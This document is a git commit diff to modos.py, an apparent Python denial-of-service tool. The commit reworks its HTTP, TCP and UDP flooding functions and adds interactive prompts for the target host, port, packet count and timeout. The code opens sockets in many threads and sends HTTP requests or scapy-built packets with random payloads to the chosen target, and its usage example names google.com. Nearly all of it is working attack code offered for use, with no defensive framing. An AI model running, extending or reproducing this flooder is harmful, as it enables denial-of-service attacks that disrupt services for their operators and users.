f7994adba7447b4611a508a82f16069e1b363944
Alexey <badperson483@gmail.com>
2019-01-18 16:45:29 +0300

    Upgrade sending way

--- modos.py
+++ modos.py
@@ -10,51 +10,91 @@ from threading import Thread
 from termcolor import colored
 
 
+version = 2.0
+
 def showBanner():
 	with open("lib/banner.txt") as f:
-		print(colored( f.read(), "red"))
+		print(colored( f.read(), "red") + "[" + str(version) + "]\n")
 
 def usageMsg():
-	print("USAGE: python " + sys.argv[0] + "  [HOST] [PORT] [THREADS] [DURATION]"
+	print("USAGE: python " + sys.argv[0] + "  [HOST] [PORT] [PACKETS] [TIMEOUT]"
                 "\nEXAMPLE: python " + sys.argv[0] + "  http://google.com 80 10 5\n")
 	exit(0)
 
 showBanner()
+ 
+ip       = ""
+host_arr = []	
 
-if len(sys.argv) != 5:
+if len(sys.argv) == 1:
+
+	while True:
+
+		target     = input("[+]TARGET > ")
+
+		try:
+			host_arr = target.split('/')
+			host     = host_arr[2]
+			ip       = str(socket.gethostbyname(host))
+			break
+
+		except:
+
+			if len(target.split('.')) == 4:
+				host = target
+				ip   = str(host)
+				break
+
+			else:
+				print(colored("Host is incorrect!","red"))
+
+	while True:
+
+		try:
+			port     = int(input("[+]PORT > "))
+			threads  = int(input("[+]PACKETS > "))
+			timeout  = float(input("[+]TIMEOUT (less than 1) > "))
+			print("")
+			break
+
+		except:
+			print(colored("Something went wrong!", "red"))
+
+elif len(sys.argv) != 5:
 	usageMsg()
 
-try:
-	ip       = ""
-	host     = ""
-	host_arr = []
-	port     = int(sys.argv[2])
-	threads  = int(sys.argv[3])
-	duration = int(sys.argv[4])
-except:
-	usageMsg()
-
-try:
-	host_arr = sys.argv[1].split('/')
-	host     = host_arr[2]
-	ip       = str(socket.gethostbyname(host))
-
-except:
-
-	if len(sys.argv[1].split('.')) == 4:
-		host = sys.argv[1]
-		ip   = str(host)
-
-	else:
-		print(colored("Host is incorrect!\n","red"))
+else:
+	try:
+		ip       = ""
+		host     = ""
+		host_arr = []
+		port     = int(sys.argv[2])
+		threads  = int(sys.argv[3])
+		timeout  = float(sys.argv[4])
+	except:
 		usageMsg()
+
+	try:
+		host_arr = sys.argv[1].split('/')
+		host     = host_arr[2]
+		ip       = str(socket.gethostbyname(host))
+
+	except:
+
+		if len(sys.argv[1].split('.')) == 4:
+			host = sys.argv[1]
+			ip   = str(host)
+
+		else:
+			print(colored("Host is incorrect!\n","red"))
+			usageMsg()
+
 
 url      = ''
 i        = 3
 req      = 0
 err      = 0
 d        = "-------------"
-prog     = (duration * 60.0) / 100.0
 
 while i < len(host_arr):
 	url += host_arr[i] + "/"
@@ -90,98 +130,111 @@ except:
 sock.close()
 
 def atackHttp():
-	while True:
-		global req
-		global err
+	global req
+	global err
 
-		req += 1
-		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	req += 1
+	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-		try:
-			sock.connect((host, port))
-			sock.send(request.encode())
-		except:
-			err += 1
-		finally:
-			sock.close()
+	try:
+		sock.connect((host, port))
+		sock.send(request.encode())
+	except:
+		err += 1
+	finally:
+		sock.close()
 
-		if req % 100 == 0:
-			print(colored("[+]", "green") + " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err, "red") + "] ") 
+	if req % 1000 == 0:
+		print(colored("[+]", "green") + " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err, "red") + "] ") 
 
 def atackTcp():
+	global req
+	global err
+
 	data = random._urandom(1024)
 	r    = bytes(IP(dst=host)/TCP(sport=RandShort(), dport=int(port))/data)
 
-	while True:
-		global req
-		global err
+	req += 1
+	sock = socket.socket()
 
-		req += 1
-		sock = socket.socket()
+	try:
+		sock.connect((ip, port))
+		sock.send(r)
+	except:
+		err += 1
+	finally:
+		sock.close()
 
-		try:
-			sock.connect((ip, port))
-			sock.send(r)
-		except:
-			err += 1
-		finally:
-			sock.close()
-
-		if req % 100 == 0:
-			print(colored("[+]", "green") + " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err,"red") + "] ")
+	if req % 1000 == 0:
+		print(colored("[+]", "green") + " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err,"red") + "] ")
 
 def atackUdp():
+	global req
+	global err
+
 	data = random._urandom(1024)
 	r    = bytes(IP(dst=host)/UDP(dport=int(port))/data)
 
-	while True:
-		global req
-		global err
+	req += 1
+	sock = socket.socket()
 
-		req += 1
-		sock = socket.socket()
+	try:
+		sock.connect((ip, port))
+		sock.send(r)
+	except:
+			err += 1
+	finally:
+		sock.close()
 
-		try:
-			sock.connect((ip, port))
-			sock.send(r)
-		except:
- 			err += 1
-		finally:
-			sock.close()
-
-		if req % 100 == 0:
-			print(colored("[+]", "green")+ " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err,"red") + "] ")
+	if req % 1000 == 0:
+		print(colored("[+]", "green")+ " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err,"red") + "] ")
 
 alltypes = ['udp','tcp','http','1','2','3']
-type     = input("[HTTP/TCP/UDP][1/2/3] > ")
+mode     = ""
 
-if type.lower() in alltypes:
-	print('[+]Type set to ' + type)
-else:
-	print(colored('\nWrong type!\n',"red"))
-	exit()
+while True:
 
-print("[*]STARTING...")
+	type = str(input("[HTTP/TCP/UDP][1/2/3] > "))
+
+	if type.lower() in alltypes:
+		if type == '1' or type.lower() == 'http':
+			mode = 'HTTP'
+		elif type == '2' or type.lower() == 'tcp':
+			mode = 'TCP'
+		elif type == '3' or type.lower() == 'udp':
+			mode = 'UDP'
+
+		print('[+]Mode set to ' + mode)
+		break
+
+	else:
+		print(colored('Wrong type!',"red"))
+		
+
+print("[*]STARTING...\n")
+
+all_threads = []
 
 for i in range(threads):
 
-	if type == '1' or type.lower() == 'http':
+	if mode == 'HTTP':
 		th = Thread(target=atackHttp)
-	elif type == '2' or type.lower() == 'tcp':
+	elif mode == 'TCP':
 		th = Thread(target=atackTcp)
-	elif type == '3' or type.lower() == 'udp':
+	elif mode == 'UDP':
 		th = Thread(target=atackUdp)
 
-	th.daemon = True
-	th.start()
+	try:
+		th.daemon = True
+		th.start()
+		all_threads.append(th)
+	except:
+		print(colored("Initialization failed...", "red"))
 
-print(colored("[*]ALL THREADS ARE STARTED\n", "green"))
+	time.sleep(timeout)
 
-try:
-	time.sleep(duration * 60)
-except:
-	print(colored("\nABORTING", "red"))
-	exit()
+for thr in all_threads:
+	thr.join()
 
 print("\nDone!")
 print("Total: " + str(req) + ", failed: " + str(err) + "\n")
